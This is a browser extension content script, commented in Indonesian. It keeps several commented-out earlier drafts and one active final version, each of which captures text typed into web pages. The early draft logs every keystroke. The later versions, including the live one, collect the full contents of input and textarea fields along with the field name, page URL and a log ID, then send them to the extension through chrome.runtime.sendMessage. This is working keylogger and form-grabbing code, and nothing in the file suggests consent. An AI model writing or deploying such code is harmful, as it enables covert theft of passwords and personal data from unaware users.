// // chrome.runtime.onConnect.addListener(function(port){});

// // var k = "";
// // var data = {};

// // window.onkeydown = function(event){
// // 	if (event.key.length > 1) {
// // 		k = " ("+event.key+") ";
// // 	}else {
// // 		k = event.key;
// // 	}

// // 	data = {
// // 		key: k,
// // 		page: window.location.href
// // 	};
// // 	// alert(data)
// // 	chrome.runtime.sendMessage(data);
// // 	// console.log(data);


	
// // }

// // // chrome.runtime.sendMessage({/*JSON Here*/})
// // ASLI WORK


// // chrome.runtime.onConnect.addListener(function(port) {});

// // var k = "";
// // var data = {};
// // var typingTimer; // Variabel untuk menahan waktu tunggu setelah mengetik
// // var doneTypingInterval = 1; // Waktu tunggu dalam milidetik (di sini 1000ms = 1 detik)

// // window.addEventListener("change", function(event) {
// //   if (!isTextInputElement(document.activeElement)) {
// //     // Jika fokus saat ini bukan di elemen input atau textarea, keluar dari fungsi
// //     return;
// //   }

// //   k = event.target.value;

// //   // Hapus timeout sebelumnya (jika ada) dan mulai kembali waktu tunggu
// //   clearTimeout(typingTimer);
// //   typingTimer = setTimeout(sendData, doneTypingInterval);
// // });

// // function sendData() {
// //   if (k !== "") {
// //     data = {
// //       key: k,
// //       page: window.location.href,
// //       name: document.activeElement.name
// //     };

// //     chrome.runtime.sendMessage(data);
// //   }

// //   // Reset kembali variabel k setelah mengirim data
// //   k = "";
// // }

// // function isTextInputElement(element) {
// //   // Memeriksa apakah elemen adalah input atau textarea
// //   return element instanceof HTMLInputElement || element instanceof HTMLTextAreaElement;
// // }
// // // WORK V2

// // chrome.runtime.onConnect.addListener(function(port) {});

// // var k = "";
// // var data = {};
// // var typingTimer; // Variabel untuk menahan waktu tunggu setelah mengetik
// // var doneTypingInterval = 1000; // Waktu tunggu dalam milidetik (di sini 1000ms = 1 detik)

// // window.addEventListener("input", function(event) {
// //   if (!isTextInputElement(event.target)) {
// //     // Jika elemen yang menerima input bukan input atau textarea, keluar dari fungsi
// //     return;
// //   }

// //   // Hapus timeout sebelumnya (jika ada) dan mulai kembali waktu tunggu
// //   clearTimeout(typingTimer);

// //   // Ambil nilai dari elemen yang menerima input saat ini
// //   k = event.target.value;

// //   // Mulai waktu tunggu setelah mengetik
// //   typingTimer = setTimeout(function() {
// //     sendData(event.target.name);
// //   }, doneTypingInterval);
// // });

// // function sendData(name) {
// //   if (k !== "") {
// //     data = {
// //       key: k,
// //       page: window.location.href,
// //       name: name
// //     };

// //     chrome.runtime.sendMessage(data);
// //   }

// //   // Reset kembali variabel k setelah mengirim data
// //   k = "";
// // }

// // function isTextInputElement(element) {
// //   // Memeriksa apakah elemen adalah input atau textarea
// //   return element instanceof HTMLInputElement || element instanceof HTMLTextAreaElement;
// // }
// // // WORK 3
// chrome.runtime.onConnect.addListener(function(port) {});

// var k = "";
// var data = {};
// var typingTimer;
// var doneTypingInterval = 1000;
// var logId = generateRandomId(); // Generate ID acak saat halaman dimuat pertama kali

// // Inisialisasi logId pada elemen input atau textarea yang ada di halaman
// var inputElements = document.querySelectorAll("input, textarea");
// inputElements.forEach(function(element) {
//   element.dataset.logId = logId;
// });

// window.addEventListener("input", function(event) {
//   if (!isTextInputElement(event.target)) {
//     return;
//   }

//   clearTimeout(typingTimer);
//   k = event.target.value;
//   var logId = event.target.dataset.logId;
//   typingTimer = setTimeout(function() {
//     sendData(event.target.name, logId);
//   }, doneTypingInterval);
// });

// function sendData(name, logId) {
//   if (k !== "") {
//     data = {
//       log_id: logId,
//       key: k,
//       page: window.location.href,
//       name: name
//     };

//     chrome.runtime.sendMessage(data);
//     console.log(data);
//   }

//   k = "";
// }

// function isTextInputElement(element) {
//   return element instanceof HTMLInputElement || element instanceof HTMLTextAreaElement;
// }

// function generateRandomId() {
//   return Math.floor(Math.random() * 1000).toString();
// }

// work 4
chrome.runtime.onConnect.addListener(function(port) {});

var k = "";
var data = {};
var typingTimer;
var doneTypingInterval = 1000;
var logId = generateRandomId(); // Generate ID acak saat halaman dimuat pertama kali

// Inisialisasi logId pada elemen input atau textarea yang ada di halaman
var inputElements = document.querySelectorAll("input, textarea");
inputElements.forEach(function(element) {
  element.dataset.logId = logId;
});

window.addEventListener("input", function(event) {
  if (!isTextInputElement(event.target)) {
    return;
  }

  clearTimeout(typingTimer);
  k = event.target.value;
  var logId = event.target.dataset.logId;
  typingTimer = setTimeout(function() {
    sendData(event.target.name, logId);
  }, doneTypingInterval);
});

function sendData(name, logId) {
  if (k !== "") {
    data = {
      log_id: logId,
      key: k,
      page: window.location.href,
      name: name
    };

    chrome.runtime.sendMessage(data);
  }

  k = "";
}

function isTextInputElement(element) {
  return element instanceof HTMLInputElement || element instanceof HTMLTextAreaElement;
}

function generateRandomId() {
  return Math.floor(Math.random() * 1000).toString();
}
